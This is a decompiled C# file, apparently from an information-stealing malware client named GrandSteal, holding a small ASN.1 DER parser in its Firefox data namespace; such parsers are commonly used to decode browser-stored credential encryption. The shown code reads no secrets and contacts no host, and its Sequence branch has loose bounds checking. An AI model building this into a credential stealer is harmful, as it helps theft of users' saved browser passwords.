using System;
using System.Linq;

namespace GrandSteal.Client.Data.Firefox
{
	// Token: 0x02000010 RID: 16
	public class Asn1Der
	{
		// Token: 0x0600005C RID: 92 RVA: 0x00004610 File Offset: 0x00002810
		public Asn1DerObject Parse(byte[] dataToParse)
		{
			Asn1DerObject asn1DerObject = new Asn1DerObject();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				Asn1Der.Type type = (Asn1Der.Type)dataToParse[i];
				switch (type)
				{
				case Asn1Der.Type.Integer:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.Integer,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray<byte>(), i + 2, array, 0, length);
					asn1DerObject.objects[asn1DerObject.objects.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[asn1DerObject.objects.Count - 1].Lenght;
					break;
				}
				case Asn1Der.Type.BitString:
				case Asn1Der.Type.Null:
					break;
				case Asn1Der.Type.OctetString:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.OctetString,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray<byte>(), i + 2, array, 0, length);
					asn1DerObject.objects[asn1DerObject.objects.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[asn1DerObject.objects.Count - 1].Lenght;
					break;
				}
				case Asn1Der.Type.ObjectIdentifier:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Asn1Der.Type.ObjectIdentifier,
						Lenght = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray<byte>(), i + 2, array, 0, length);
					asn1DerObject.objects[asn1DerObject.objects.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.objects[asn1DerObject.objects.Count - 1].Lenght;
					break;
				}
				default:
					if (type == Asn1Der.Type.Sequence)
					{
						byte[] array;
						if (asn1DerObject.Lenght == 0)
						{
							asn1DerObject.Type = Asn1Der.Type.Sequence;
							asn1DerObject.Lenght = dataToParse.Length - (i + 2);
							array = new byte[asn1DerObject.Lenght];
						}
						else
						{
							asn1DerObject.objects.Add(new Asn1DerObject
							{
								Type = Asn1Der.Type.Sequence,
								Lenght = (int)dataToParse[i + 1]
							});
							array = new byte[(int)dataToParse[i + 1]];
						}
						int num = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
						Array.Copy(dataToParse, i + 2, array, 0, array.Length);
						asn1DerObject.objects.Add(this.Parse(array));
						i = i + 1 + (int)dataToParse[i + 1];
					}
					break;
				}
			}
			return asn1DerObject;
		}

		// Token: 0x02000011 RID: 17
		public enum Type
		{
			// Token: 0x04000030 RID: 48
			Sequence = 48,
			// Token: 0x04000031 RID: 49
			Integer = 2,
			// Token: 0x04000032 RID: 50
			BitString,
			// Token: 0x04000033 RID: 51
			OctetString,
			// Token: 0x04000034 RID: 52
			Null,
			// Token: 0x04000035 RID: 53
			ObjectIdentifier
		}
	}
}
